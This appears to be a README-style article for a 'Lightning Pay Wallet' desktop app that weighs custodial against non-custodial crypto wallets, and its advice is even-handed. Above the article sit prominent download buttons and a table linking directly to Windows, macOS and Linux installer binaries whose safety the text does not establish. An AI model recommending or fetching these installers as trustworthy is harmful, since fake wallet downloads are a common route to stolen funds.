<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Custodial vs non-custodial wallet: which one is actually safer
Two different risks, not one scale. The right answer depends on what you are protecting against.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

The custody question is usually asked as "which is safer", and that framing hides the real choice.
Custodial and non-custodial wallets protect against different failures, and each one is exposed to the
failure the other prevents.

## What custodial means

A custodial wallet holds your balance on its own books. You log in, the company holds the keys, and
transactions are entries it makes for you. Convenience is the point: password resets, support, card
payments, no backups.

The risks are concentrated in one place. The company can freeze an account, lose the keys, be hacked,
or disappear. History has examples of each. You are trusting an operator.

## What non-custodial means

A non-custodial wallet holds the keys on your device. Nobody can freeze the balance, and no company
failure can take the funds. The trade is that nobody can help either: a lost phrase is a lost wallet,
and there is no password reset.

The risks move to you: backup discipline, device security, and the operational care of not pasting a
phrase into a website.

## Which failure are you protecting against?

Against a company failing, freezing you, or vanishing: non-custodial wins outright, because the
failure mode does not apply.

Against your own mistakes, a lost device or a forgotten backup: custodial wins, because a password and
an email recover the account.

Against theft of your device: it depends. A custodial account with a strong password and two-factor
authentication survives a stolen phone; a non-custodial wallet survives it only if the phrase was not
stored with the device.

## Why "not your keys" is not the whole argument

The slogan is true and incomplete. Self-custody without a tested backup is worse than custody, because
it converts a support ticket into a permanent loss. The honest position is conditional: non-custodial
is safer *for people who back up*, and custodial is safer *for people who will not*.

## A common arrangement

Most people who use both keep a small balance in a custodial app for convenience and the rest in a
non-custodial wallet they control. That splits the risk rather than pretending one side has none.

## Questions people ask

### Is a non-custodial wallet safer than an exchange?

Against operator failure, yes. Against user error, no. The risks are different, not smaller.

### Can a custodial wallet be insured?

Some claim to be. Insurance covers what the policy says, and this page has no view on any specific
provider.

### Does Lightning Pay hold my funds?

No. Keys are on your machine, which is why the recovery questions on this site all come back to the
phrase.
